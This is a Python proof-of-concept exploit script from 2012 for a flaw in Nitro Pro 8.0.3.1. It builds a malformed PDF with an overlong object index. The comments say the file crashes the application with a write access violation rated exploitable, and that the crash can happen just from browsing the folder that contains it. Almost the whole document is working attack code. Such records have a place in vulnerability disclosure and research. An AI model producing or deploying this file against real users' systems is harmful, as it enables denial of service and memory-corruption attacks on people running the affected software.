#!C:\Python27\python.exe

# Exploit Title: Nitro Pro 8.0.3.1 - DoS
# Date: 2012-10-07
# Exploit Author: John Cobb
# Author Homepage: www.NoBytes.com
# Vendor Homepage: www.nitropdf.com
# Version: 8.0.3.1
# Tested on: Win7 64bit
# CVE : None

# When the Object Index exceeds 10 characters the app crashes:
#
# !exploitable
# BUG_TITLE:Exploitable - User Mode Write AV starting at npdf!ProvideCoreHFT+0x000000000010886a (Hash=0x265b4f1d.0x020d4f2c)
# EXPLANATION:User mode write access violations that are not near NULL are exploitable.
#
# Bonus: App crashes when just browsing the folder which contains the PDF...
#

sPDFHeader      = "\x25\x50\x44\x46\x2D\x31\x2E\x32\x0D"
sPDFComment     = "\x25\xE2\xE3\xCF\xD3\x0A"
sPDFObjectIndex = "\x31" * 11 # The Crash
sPDFObject      = "\x20\x30\x20\x6F\x62\x6A"

payload = sPDFHeader + sPDFComment + sPDFObjectIndex + sPDFObject

f = open("exploit.pdf", 'w')
f.write(payload)
f.close()